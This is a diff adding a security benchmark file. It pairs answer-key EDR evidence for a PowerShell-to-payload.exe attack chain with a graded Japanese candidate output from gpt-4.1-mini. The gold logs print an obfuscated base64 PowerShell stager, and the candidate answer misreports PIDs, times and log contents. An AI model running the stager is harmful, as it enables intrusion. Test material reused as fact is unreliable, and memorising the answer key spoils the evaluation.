+            "subject": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "action": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "object": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "evidence": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "step_total": {
+              "max": 4,
+              "score": null
+            }
+          },
+          "canonical_evidence": [
+            {
+              "source_stream": "cbc-edr",
+              "source_table": "cbc_events",
+              "source_row_id": 13141,
+              "timestamp_utc": "2022-07-20T00:54:47.7673716Z",
+              "action": "ACTION_CREATE_PROCESS",
+              "process_path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "process_pid": 3820,
+              "parent_path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "parent_pid": 2976,
+              "process_cmdline": "\"powershell.exe\" -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAMUL12ICA7VXbY/aR'+'hD'+'+Xqn/wYqQMAoHNriXu0iRasPxFmxe/HZAUWXstb3H2kvsNRxp+987C/juolzatFIsWax3Z2Znn3lmZ{1}mL1GeYp{1}IeCH/8/JNweaZe5iWCWPGLsF0XKrtsup3WnpcrO6p1hA+CuFJ3uy5NPJyu37/vFFmGUnb+bvQRU/McJRuCUS7WhD8FN0YZuppsHpDPhD+Eyu+NPqEbj1zEjh3Pj5FwpaYBXxtT3+OeNcwdwUys/vZbtba6kteNu0+FR3Kxah'+'5zhpJGQEi1JvxV4xtaxx0Sqzr2M5rTkDVcnLZ'+'bDTvNvRAZYG2PdMRiGuRVOMzzcTLEiiw9n4qbOQuJVRhOM+qrQZChPK/WhRXfYLVe/yquLrvPi5ThBDWGKUMZ3Zko22Mf5Y2BlwYEzVG4Bi2TZTiN1rUaiO3pFomVtCCkLvwXM6KBDiV236skvlQCqSnLanWI6ivn1GlQEHTWrL7i6IkJNXie2AAI/sVBDEsGHZetVyj0PFE+q9MKAp/FKc3xSfeDINUFHXb3GM2O8Fmxs{1}LV1k+IC5VACtP691qTS1WuWAQws3IoDtbP+l8QoBJwpX8{1}cxeFOEXdY+ol2C/5Kr4WExQSdMKjUYoZ4J5YvSy{1}oIsIijzGUebU+ErtLsHsSVcrMAlQpvoQ1xy8{1}pDXvnTmHDix'+'Okx1lA'+'B252/{1}aiWELEGl9CUzjuXu/BuEqh3i5XldmBaQpn5dMJFHUFAX1DTHlyW1YPQ0rD67qxeEYd/LWWluXfsCzMumHZrmLCt8iCkAYJk75GOPcDzqw{1}AHSDuaOCo3r76KRscjBHIHLO0hGjDDUTAZZ0oGfp5YUWuYiA2THUEJyJyKRo94EZSIS4acqOVFKKi+6maZBmfOc1RKOF44CaE2C'+'WV1wcEZ{1}wLEEQZm/S8Xvq484EsnQ5e4iGVqrbQj4+SvHMLfHzhBL/ic0M{1}YINHLaKJ5ObpWzjVGfNOc4KkKz2KYEj'+'0YbbE8PMCrw2t33wUfR5QdP3YHTd3v5NN+70bFh+j{1}3xiqH4wCdG'+'uC3'+'MxRWGeqDmZY0pTY1yQLxvaQLYbqwMJStIh9Ik3BhrnIJXwYuLrf1T4fWjnQVFEG95LabiuTtrQF8BZYjrZqYCT48DiGMRTTyV{1}b5po0JHejznzjt'+'npLlwyaSi8OXZqb14tus9m8Dbz+LyRQNRq0SOE5c2oN/ERrNh09YJY'+'tG5b9Nv7M'+'z2m5t9ee+5{1}vzBt5/KBGH3vBbpPM90Fbjywyi3RLLfRuHjl{1}x3iYvRsOopbR2Uaze+2w6Tv3S3c09u5ne8PS2+MHvTXsxGOzNzesziHa9Em2NLXB0jWyzRF0WvFx05LJ+PN'+'W{1}b0Ko+vLk46i6KZmLdxl7CfbJztqP7p20iRt3jqW3aJd8Jm+PYLDE3zD/R63Y2O5lRSzq8mL1o28aM9z/cGYbezlYtEOZr4pO5PeaLuxRpb90Btb/eXE'+'dOPHheurdj++x8tmv3nrjh6JQdXumMY9wEQOLCd5yBxTeQdrrhftQm+oAk6dkdKnd3afhk4Sy/Pddf/kF+DoJBHT4pjL9w4D2/aGkaUC7vOpKivTpmO1743rOx881j7N+pF6ByMP3pmqWV4Pb+239015CXsraeq0InUIa7a8pHc7b6Ts'+'mw7nz2clH6j+BOzfE1c3wuv+nsd476fzY9C/KzaJI6nj/YF5I/BZs5q39oc3kAQrG6es3VpX9qNP2'+'Yw3iZ9/qhD/RSZ8qwXqXpb'+'HHoEM{1}d5WFqke'+'zXqXZjWlmGuIIlx7tihLEYF7A'+'twkyuxWCaE+75W8qUGbPjdP3svt4cml10Y14Umw9txCy6n375f{1}ItQLnsyNM'+'UojFtelx7YkQeuTHiXlVBi+/2AdujuKJ2N13jwBl9I2OdkGcz{1}URPFHQwU3JAbF+pt{1}fQs32H{1}LxRVq/bnmcfQ'+'0SslL7E6HemLBS+AAMRlOveJXozM9wMAV+iRUGL84vLyIVI5q9iMpcyncMfwE/0KZ57l/WP0uGkl1js1Xk19OvOh2P+z0rocZyJnQfA{1}634VeBeGSIi9iC2EB/oeXh/9BmBTsyoAL56n9/Q2hf1fym{1}wAAA{0}{0}')-f'=','g')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))",
+              "object_name": "c:\\windows\\system32\\cmd.exe",
+              "remote_ip": null,
+              "remote_port": null,
+              "netconn_domain": null,
+              "childproc_name": "c:\\windows\\system32\\cmd.exe",
+              "childproc_pid": 2168
+            }
+          ],
+          "supporting_evidence": {
+            "source_types": [
+              "CBC event"
+            ],
+            "sample_logs": [
+              "cbc-edr table=cbc_events row_id=13141 time=2022-07-20T00:54:47.7673716Z action=ACTION_CREATE_PROCESS process=c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe pid=3820 parent_path=c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe parent_pid=2976 process_cmdline=\"powershell.exe\" -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String((('H4sIAMUL12ICA7VXbY/aR'+'hD'+'+Xqn/wYqQMAoHNriXu0iRasPxFmxe/HZAUWXstb3H2kvsNRxp+987C/juolzatFIsWax3Z2Znn3lmZ{1}mL1GeYp{1}IeCH/8/JNweaZe5iWCWPGLsF0XKrtsup3WnpcrO6p1hA+CuFJ3uy5NPJyu37/vFFmGUnb+bvQRU/McJRuCUS7WhD8FN0YZuppsHpDPhD+Eyu+NPqEbj1zEjh3Pj5FwpaYBXxtT3+OeNcwdwUys/vZbtba6kteNu0+FR3Kxah'+'5zhpJGQEi1JvxV4xtaxx0Sqzr2M5rTkDVcnLZ'+'bDTvNvRAZYG2PdMRiGuRVOMzzcTLEiiw9n4qbOQuJVRhOM+qrQZChPK/WhRXfYLVe/yquLrvPi5ThBDWGKUMZ3Zko22Mf5Y2BlwYEzVG4Bi2TZTiN1rUaiO3pFomVtCCkLvwXM6KBDiV236skvlQCqSnLanWI6ivn1GlQEHTWrL7i6IkJNXie2AAI/sVBDEsGHZetVyj0PFE+q9MKAp/FKc3xSfeDINUFHXb3GM2O8Fmxs{1}LV1k+IC5VACtP691qTS1WuWAQws3IoDtbP+l8QoBJwpX8{1}cxeFOEXdY+ol2C/5Kr4WExQSdMKjUYoZ4J5YvSy{1}oIsIijzGUebU+ErtLsHsSVcrMAlQpvoQ1xy8{1}pDXvnTmHDix'+'Okx1lA'+'B252/{1}aiWELEGl9CUzjuXu/BuEqh3i5XldmBaQpn5dMJFHUFAX1DTHlyW1YPQ0rD67qxeEYd/LWWluXfsCzMumHZrmLCt8iCkAYJk75GOPcDzqw{1}AHSDuaOCo3r76KRscjBHIHLO0hGjDDUTAZZ0oGfp5YUWuYiA2THUEJyJyKRo94EZSIS4acqOVFKKi+6maZBmfOc1RKOF44CaE2C'+'WV1wcEZ{1}wLEEQZm/S8Xvq484EsnQ5e4iGVqrbQj4+SvHMLfHzhBL/ic0M{1}YINHLaKJ5ObpWzjVGfNOc4KkKz2KYEj'+'0YbbE8PMCrw2t33wUfR5QdP3YHTd3v5NN+70bFh+j{1}3xiqH4wCdG'+'uC3'+'MxRWGeqDmZY0pTY1yQLxvaQLYbqwMJStIh9Ik3BhrnIJXwYuLrf1T4fWjnQVFEG95LabiuTtrQF8BZYjrZqYCT48DiGMRTTyV{1}b5po0JHejznzjt'+'npLlwyaSi8OXZqb14tus9m8Dbz+LyRQNRq0SOE5c2oN/ERrNh09YJY'+'tG5b9Nv7M'+'z2m5t9ee+5{1}vzBt5/KBGH3vBbpPM90Fbjywyi3RLLfRuHjl{1}x3iYvRsOopbR2Uaze+2w6Tv3S3c09u5ne8PS2+MHvTXsxGOzNzesziHa9Em2NLXB0jWyzRF0WvFx05LJ+PN'+'W{1}b0Ko+vLk46i6KZmLdxl7CfbJztqP7p20iRt3jqW3aJd8Jm+PYLDE3zD/R63Y2O5lRSzq8mL1o28aM9z/cGYbezlYtEOZr4pO5PeaLuxRpb90Btb/eXE'+'dOPHheurdj++x8tmv3nrjh6JQdXumMY9wEQOLCd5yBxTeQdrrhftQm+oAk6dkdKnd3afhk4Sy/Pddf/kF+DoJBHT4pjL9w4D2/aGkaUC7vOpKivTpmO1743rOx881j7N+pF6ByMP3pmqWV4Pb+239015CXsraeq0InUIa7a8pHc7b6Ts'+'mw7nz2clH6j+BOzfE1c3wuv+nsd476fzY9C/KzaJI6nj/YF5I/BZs5q39oc3kAQrG6es3VpX9qNP2'+'Yw3iZ9/qhD/RSZ8qwXqXpb'+'HHoEM{1}d5WFqke'+'zXqXZjWlmGuIIlx7tihLEYF7A'+'twkyuxWCaE+75W8qUGbPjdP3svt4cml10Y14Umw9txCy6n375f{1}ItQLnsyNM'+'UojFtelx7YkQeuTHiXlVBi+/2AdujuKJ2N13jwBl9I2OdkGcz{1}URPFHQwU3JAbF+pt{1}fQs32H{1}LxRVq/bnmcfQ'+'0SslL7E6HemLBS+AAMRlOveJXozM9wMAV+iRUGL84vLyIVI5q9iMpcyncMfwE/0KZ57l/WP0uGkl1js1Xk19OvOh2P+z0rocZyJnQfA{1}634VeBeGSIi9iC2EB/oeXh/9BmBTsyoAL56n9/Q2hf1fym{1}wAAA{0}{0}')-f'=','g')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd())) object_name=c:\\windows\\system32\\cmd.exe childproc_name=c:\\windows\\system32\\cmd.exe childproc_pid=2168"
+            ]
+          }
+        },
+        {
+          "step_id": "s4_09_ps2976_hidden_parent-S05",
+          "order": 5,
+          "subject": "cmd.exe (PID 2168)",
+          "action": "started",
+          "object": "payload.exe (PID 4184)",
+          "segment": "observed_attack_cluster",
+          "evidence_basis": "Canonical CBC EDR event row",
+          "confidence": "observed",
+          "process_code_object": "payload.exe (PID 4184)",
+          "scoring_template": {
+            "subject": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "action": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "object": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "evidence": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "step_total": {
+              "max": 4,
+              "score": null
+            }
+          },
+          "canonical_evidence": [
+            {
+              "source_stream": "cbc-edr",
+              "source_table": "cbc_events",
+              "source_row_id": 13187,
+              "timestamp_utc": "2022-07-20T00:54:50.1925104Z",
+              "action": "ACTION_CREATE_PROCESS",
+              "process_path": "c:\\windows\\system32\\cmd.exe",
+              "process_pid": 2168,
+              "parent_path": "c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe",
+              "parent_pid": 3820,
+              "process_cmdline": "C:\\Windows\\system32\\cmd.exe",
+              "object_name": "c:\\users\\aalsahee\\payload.exe",
+              "remote_ip": null,
+              "remote_port": null,
+              "netconn_domain": null,
+              "childproc_name": "c:\\users\\aalsahee\\payload.exe",
+              "childproc_pid": 4184
+            }
+          ],
+          "supporting_evidence": {
+            "source_types": [
+              "CBC event"
+            ],
+            "sample_logs": [
+              "cbc-edr table=cbc_events row_id=13187 time=2022-07-20T00:54:50.1925104Z action=ACTION_CREATE_PROCESS process=c:\\windows\\system32\\cmd.exe pid=2168 parent_path=c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe parent_pid=3820 process_cmdline=C:\\Windows\\system32\\cmd.exe object_name=c:\\users\\aalsahee\\payload.exe childproc_name=c:\\users\\aalsahee\\payload.exe childproc_pid=4184"
+            ]
+          }
+        },
+        {
+          "step_id": "s4_09_ps2976_hidden_parent-S06",
+          "order": 6,
+          "subject": "payload.exe (PID 4184)",
+          "action": "started",
+          "object": "payload.exe (PID 3652)",
+          "segment": "observed_attack_cluster",
+          "evidence_basis": "Canonical CBC EDR event row",
+          "confidence": "observed",
+          "process_code_object": "payload.exe (PID 3652)",
+          "scoring_template": {
+            "subject": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "action": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "object": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "evidence": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "step_total": {
+              "max": 4,
+              "score": null
+            }
+          },
+          "canonical_evidence": [
+            {
+              "source_stream": "cbc-edr",
+              "source_table": "cbc_events",
+              "source_row_id": 13300,
+              "timestamp_utc": "2022-07-20T00:54:50.8785496Z",
+              "action": "ACTION_CREATE_PROCESS",
+              "process_path": "c:\\users\\aalsahee\\payload.exe",
+              "process_pid": 4184,
+              "parent_path": "c:\\windows\\system32\\cmd.exe",
+              "parent_pid": 2168,
+              "process_cmdline": "payload.exe",
+              "object_name": "c:\\users\\aalsahee\\payload.exe",
+              "remote_ip": null,
+              "remote_port": null,
+              "netconn_domain": null,
+              "childproc_name": "c:\\users\\aalsahee\\payload.exe",
+              "childproc_pid": 3652
+            }
+          ],
+          "supporting_evidence": {
+            "source_types": [
+              "CBC event"
+            ],
+            "sample_logs": [
+              "cbc-edr table=cbc_events row_id=13300 time=2022-07-20T00:54:50.8785496Z action=ACTION_CREATE_PROCESS process=c:\\users\\aalsahee\\payload.exe pid=4184 parent_path=c:\\windows\\system32\\cmd.exe parent_pid=2168 process_cmdline=payload.exe object_name=c:\\users\\aalsahee\\payload.exe childproc_name=c:\\users\\aalsahee\\payload.exe childproc_pid=3652"
+            ]
+          }
+        },
+        {
+          "step_id": "s4_09_ps2976_hidden_parent-S07",
+          "order": 7,
+          "subject": "payload.exe (PID 3652)",
+          "action": "initiated connection",
+          "object": "ortrta.net / 10.193.66.115:9999",
+          "segment": "observed_attack_cluster",
+          "evidence_basis": "Canonical CBC EDR event row",
+          "confidence": "observed",
+          "process_code_object": "ortrta.net / 10.193.66.115:9999",
+          "scoring_template": {
+            "subject": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "action": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "object": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "evidence": {
+              "max": 1,
+              "score": null,
+              "note": ""
+            },
+            "step_total": {
+              "max": 4,
+              "score": null
+            }
+          },
+          "canonical_evidence": [
+            {
+              "source_stream": "cbc-edr",
+              "source_table": "cbc_events",
+              "source_row_id": 11453,
+              "timestamp_utc": "2022-07-20T00:54:53.2606858Z",
+              "action": "ACTION_CONNECTION_CREATE",
+              "process_path": "c:\\users\\aalsahee\\payload.exe",
+              "process_pid": 3652,
+              "parent_path": "c:\\users\\aalsahee\\payload.exe",
+              "parent_pid": 4184,
+              "process_cmdline": "payload.exe",
+              "object_name": "ortrta.net",
+              "remote_ip": "10.193.66.115",
+              "remote_port": 9999,
+              "netconn_domain": "ortrta.net",
+              "childproc_name": null,
+              "childproc_pid": null
+            }
+          ],
+          "supporting_evidence": {
+            "source_types": [
+              "CBC event"
+            ],
+            "sample_logs": [
+              "cbc-edr table=cbc_events row_id=11453 time=2022-07-20T00:54:53.2606858Z action=ACTION_CONNECTION_CREATE process=c:\\users\\aalsahee\\payload.exe pid=3652 parent_path=c:\\users\\aalsahee\\payload.exe parent_pid=4184 process_cmdline=payload.exe object_name=ortrta.net remote_ip=10.193.66.115 remote_port=9999 netconn_domain=ortrta.net"
+            ]
+          }
+        }
+      ],
+      "gold_order_pairs": [
+        [
+          "s4_09_ps2976_hidden_parent-S01",
+          "s4_09_ps2976_hidden_parent-S02"
+        ],
+        [
+          "s4_09_ps2976_hidden_parent-S02",
+          "s4_09_ps2976_hidden_parent-S03"
+        ],
+        [
+          "s4_09_ps2976_hidden_parent-S03",
+          "s4_09_ps2976_hidden_parent-S04"
+        ],
+        [
+          "s4_09_ps2976_hidden_parent-S04",
+          "s4_09_ps2976_hidden_parent-S05"
+        ],
+        [
+          "s4_09_ps2976_hidden_parent-S05",
+          "s4_09_ps2976_hidden_parent-S06"
+        ],
+        [
+          "s4_09_ps2976_hidden_parent-S06",
+          "s4_09_ps2976_hidden_parent-S07"
+        ]
+      ]
+    }
+  ]
+}
+
+CANDIDATE_OUTPUT:
+{
+  "source_run_json": "C:\\Users\\komat\\OneDrive\\Desktop\\ATLAS以外のデータセット\\docs\\current_experiment\\results_2026-07-24\\atlasv2_s3_s4_attack8_paired\\replicate_01\\runs\\gpt-4.1-mini\\stage1\\s4_pt_04_powershell_c1_stage1_run.json",
+  "run_id": "20260724T101744Z_s4_pt_04_powershell_c1_stage1_gpt-4.1-mini_official",
+  "model": "gpt-4.1-mini",
+  "instance_id": "s4_pt_04_powershell_c1_stage1",
+  "difficulty": "alert_input",
+  "experiment_stage": "stage1",
+  "expected_input_fields": [
+    "host",
+    "focus_processes",
+    "chain_window_start_utc",
+    "chain_window_end_utc",
+    "alert_time",
+    "alert_id",
+    "alert_name",
+    "alert_reason",
+    "alert_process",
+    "alert_pid",
+    "alert_source_stream",
+    "alert_severity"
+  ],
+  "clue": "これは Windows エンドポイントログからコード行動列を復元するタスクである。\n起点情報は探索範囲を示すだけであり、未観測の事実ではない。\nraw path、command line、process name、source_stream、alert_id、event_record_id、PID/PPID、timestamp は観測値をそのまま保持する。\n最終 JSON の自然言語値は日本語で書き、JSON の項目名は ASCII のままにする。\n\n## 入力条件\n- condition: stage1\n- host: WIN-32-H1\n- process: powershell.exe\n- timestamp: 2022-07-20 00:56:14\n- 参考 UTC 時間範囲: 2022-07-20T00:41:14.327000Z から 2022-07-20T01:11:14.327000Z\n- 参考 database 時間範囲: 2022-07-20 00:41:14 から 2022-07-20 01:11:14\n- 注記: この時間範囲は探索補助情報であり、SOC からの入力は host、process、timestamp のままである。\n- Stage 1: SOC analyst が見ている CBC alert triage 情報を初期入力に含める。\n- 入力 alert fields は探索起点であり、最終的な code step ではない。\n- alert report_name/reason は evidence として扱い、operation や code_sequence に入れない。\n- command line、parent process、child process、registry object、file object、network object、behavior category は入力から仮定しない。\n- それらの値は、存在するなら log から発見する必要がある。\n- input_alert_timestamp_utc: 2022-07-20T00:56:14.327Z\n- input_alert_database_time: 2022-07-20 00:56:14\n- input_alert_source_stream: cbc-edr-alerts\n- input_alert_id: 4enKfzv1RCOVlRF4cs8JGQ-d740a3b5-b4f1-47aa-9c6b-38539fdfa258\n- input_alert_name: Execution  - Hidden Powershell with Unusual Parent\n- input_alert_reason: None\n- input_alert_process_name: c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\n- input_alert_severity: 7\n- database には CBC alert summary rows、CBC EDR/NGAV event telemetry、Security、Sysmon、DNS、browser history が残っている。\n\n\n## CBC alert triage decision\n- For every Stage 1 CBC alert input, include a root JSON field triage_decision.\n- Set alert_disposition to close_alert or escalate_alert, and host_disposition to close_host or escalate_host_investigation.\n- Base both values on observed evidence and keep the alert-level and host-level decisions distinct.\n## 復元対象\n- 観測 log から関連 behavior chain の code_steps と code_sequence を復元する。\n- code_sequence には、観測された command line または対象操作だけを入れる。\n- CBC alert の report name/reason は code_sequence に入れない。\n- 同時刻近傍の behavior は、観測された parent/child、command、target-object evidence で接続できない限り分ける。\n",
+  "output_text": "{\n  \"input_scope\": {\n    \"host\": \"WIN-32-H1\",\n    \"process\": \"powershell.exe\",\n    \"timestamp\": \"2022-07-20 00:56:14\",\n    \"condition\": \"stage1\",\n    \"input_fields_used\": [\"host\", \"process\", \"timestamp\"]\n  },\n  \"code_steps\": [\n    {\n      \"step_id\": \"S1\",\n      \"order\": 1,\n      \"time\": \"2022-07-20 00:54:50\",\n      \"subject_process\": {\n        \"name\": \"cmd.exe\",\n        \"pid\": 4184,\n        \"path\": \"C:\\\\Windows\\\\system32\\\\cmd.exe\"\n      },\n      \"operation\": \"process_start\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"payload.exe\",\n        \"path\": null,\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"cmd.exe\",\n        \"parent_pid\": 4184,\n        \"parent_command_line\": \"C:\\\\Windows\\\\system32\\\\cmd.exe\",\n        \"child_process\": \"payload.exe\",\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"audit_logs\",\n          \"timestamp\": \"2022-07-20 00:54:50\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"process_start\",\n          \"value\": \"payload.exe start by cmd.exe\",\n          \"pid\": 4184,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S2\",\n      \"order\": 2,\n      \"time\": \"2022-07-20 00:56:14\",\n      \"subject_process\": {\n        \"name\": \"powershell.exe\",\n        \"pid\": 3820,\n        \"path\": \"c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe\"\n      },\n      \"operation\": \"process_start\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"cmd.exe\",\n        \"path\": null,\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"powershell.exe\",\n        \"parent_pid\": 3820,\n        \"parent_command_line\": null,\n        \"child_process\": \"cmd.exe\",\n        \"child_pid\": 2168\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"audit_logs\",\n          \"timestamp\": \"2022-07-20 00:56:14\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"process_start\",\n          \"value\": \"cmd.exe start by powershell.exe\",\n          \"pid\": 2168,\n          \"ppid\": 3820\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"powershell.exeのコマンドライン情報はログに記録されていないため不明\"\n      ]\n    },\n    {\n      \"step_id\": \"S3\",\n      \"order\": 3,\n      \"time\": \"2022-07-20 00:56:14\",\n      \"subject_process\": {\n        \"name\": \"powershell.exe\",\n        \"pid\": 3820,\n        \"path\": \"c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe\"\n      },\n      \"operation\": \"file_read_execute\",\n      \"object\": {\n        \"type\": \"file\",\n        \"name\": null,\n        \"path\": \"C:\\\\Windows\\\\System32\\\\imm32.dll\",\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": null,\n        \"parent_pid\": null,\n        \"parent_command_line\": null,\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"audit_logs\",\n          \"timestamp\": \"2022-07-20 00:56:14\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"file_access\",\n          \"value\": \"imm32.dll read and execute by powershell.exe\",\n          \"pid\": 3820,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S4\",\n      \"order\": 4,\n      \"time\": \"2022-07-20 00:56:14\",\n      \"subject_process\": {\n        \"name\": \"cmd.exe\",\n        \"pid\": 2168,\n        \"path\": null\n      },\n      \"operation\": \"process_start\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"payload.exe\",\n        \"path\": null,\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"cmd.exe\",\n        \"parent_pid\": 2168,\n        \"parent_command_line\": null,\n        \"child_process\": \"payload.exe\",\n        \"child_pid\": 4184\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"audit_logs\",\n          \"timestamp\": \"2022-07-20 00:56:14\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"process_start\",\n          \"value\": \"payload.exe start by cmd.exe\",\n          \"pid\": 4184,\n          \"ppid\": 2168\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S5\",\n      \"order\": 5,\n      \"time\": \"2022-07-20 00:56:14\",\n      \"subject_process\": {\n        \"name\": \"payload.exe\",\n        \"pid\": 4184,\n        \"path\": null\n      },\n      \"operation\": \"network_connection\",\n      \"object\": {\n        \"type\": \"network\",\n        \"name\": \"ortrta.net\",\n        \"path\": null,\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"payload.exe\",\n        \"parent_pid\": 4184,\n        \"parent_command_line\": null,\n        \"child_process\": null,\n        \"child_pid\": null\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"audit_logs\",\n          \"timestamp\": \"2022-07-20 00:56:14\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"network_connection\",\n          \"value\": \"ortrta.net connection by payload.exe\",\n          \"pid\": 4184,\n          \"ppid\": null\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": []\n    },\n    {\n      \"step_id\": \"S6\",\n      \"order\": 6,\n      \"time\": \"2022-07-20 00:53:00\",\n      \"subject_process\": {\n        \"name\": \"mshta.exe\",\n        \"pid\": 4724,\n        \"path\": \"C:\\\\Windows\\\\System32\\\\mshta.exe\"\n      },\n      \"operation\": \"process_start\",\n      \"object\": {\n        \"type\": \"process\",\n        \"name\": \"powershell.exe\",\n        \"path\": \"c:\\\\windows\\\\system32\\\\windowspowershell\\\\v1.0\\\\powershell.exe\",\n        \"value\": null,\n        \"data\": null\n      },\n      \"command_line\": null,\n      \"execution_context\": {\n        \"parent_process\": \"svchost.exe\",\n        \"parent_pid\": 644,\n        \"parent_command_line\": null,\n        \"child_process\": \"powershell.exe\",\n        \"child_pid\": 2976\n      },\n      \"evidence\": [\n        {\n          \"source_stream\": \"audit_logs\",\n          \"timestamp\": \"2022-07-20 00:53:00\",\n          \"alert_id\": null,\n          \"event_record_id\": null,\n          \"field\": \"process_start\",\n          \"value\": \"powershell.exe start by mshta.exe\",\n          \"pid\": 2976,\n          \"ppid\": 4724\n        }\n      ],\n      \"confidence\": \"observed\",\n      \"limitations\": [\n        \"powershell.exeのコマンドラインはログに記録されていないため不明\"\n      ]\n    }\n  ],\n  \"code_sequence\": [\n    \"powershell.exe (PID 2976) が mshta.exe (PID 4724) から起動される\",\n    \"powershell.exe (PID 3820) が powershell.exe (PID 2976) から起動される\",\n    \"powershell.exe (PID 3820) が cmd.exe (PID 2168) を起動する\",\n    \"cmd.exe (PID 2168) が payload.exe (PID 4184) を起動する\",\n    \"payload.exe (PID 4184) が ortrta.net へネットワーク接続を行う\",\n    \"powershell.exe (PID 3820) が imm32.dll などのDLLファイルを読み取り・実行する\"\n  ],\n  \"supporting_alert_evidence\": [\n    {\n      \"alert_id\": \"4enKfzv1RCOVlRF4cs8JGQ-d740a3b5-b4f1-47aa-9c6b-38539fdfa258\",\n      \"alert_name\": \"Execution  - Hidden Powershell with Unusual Parent\",\n      \"source_stream\": \"cbc-edr-alerts\",\n      \"why_supporting_only\": \"CBC alertは起点情報として利用し、コードステップの直接証拠ではないため\"\n    }\n  ],\n  \"triage_decision\": {\n    \"alert_disposition\": \"escalate_alert\",\n    \"host_disposition\": \"escalate_host_investigation\",\n    \"evidence_basis\": [\n      \"powershell.exeがmshta.exeから起動されていること\",\n      \"powershell.exeがcmd.exeを起動し、さらにpayload.exeを起動していること\",\n      \"payload.exeが外部ドメインortrta.netへネットワーク接続を行っていること\",\n      \"powershell.exeがDLLファイルを読み取り・実行していること\"\n    ]\n  },\n  \"excluded_nearby_evidence\": [],\n  \"global_limitations\": [\n    \"powershell.exeのコマンドライン情報がログに記録されていないため、実行内容の詳細が不明\",\n    \"payload.exeの一部親プロセス情報が欠落している\"\n  ],\n  \"timeline_ja\": [\n    \"2022-07-20 00:53:00 mshta.exeがsvchost.exeから起動され、powershell.exeを起動\",\n    \"2022-07-20 00:54:50 cmd.exeがpayload.exeを起動\",\n    \"2022-07-20 00:56:14 powershell.exeがcmd.exeを起動\",\n    \"2022-07-20 00:56:14 payload.exeがortrta.netへネットワーク接続\",\n    \"2022-07-20 00:56:14 powershell.exeがimm32.dllなどのDLLを読み取り・実行\"\n  ]\n}",
+  "usage": {
+    "input_tokens": 32538,
+    "output_tokens": 4362,
+    "cached_input_tokens": 0
+  }
+}
